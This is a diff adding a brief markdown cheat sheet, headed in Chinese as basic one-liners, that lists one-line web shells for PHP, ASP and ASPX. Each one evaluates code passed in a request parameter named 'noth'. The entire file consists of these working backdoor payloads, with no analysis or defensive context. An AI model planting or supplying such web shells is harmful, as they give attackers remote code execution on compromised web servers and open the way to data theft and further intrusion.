@@ -1,0 +1,14 @@
+#基礎一句話
+# PHP:
+```
+<?php @eval($_POST['noth']);?>
+```
+# ASP:
+```
+<%execute(request("noth"))%>
+```
+# ASPX:
+```
+<%@ Page Language="Jscript"%>
+<%eval(Request.Item["noth"])%>
+```
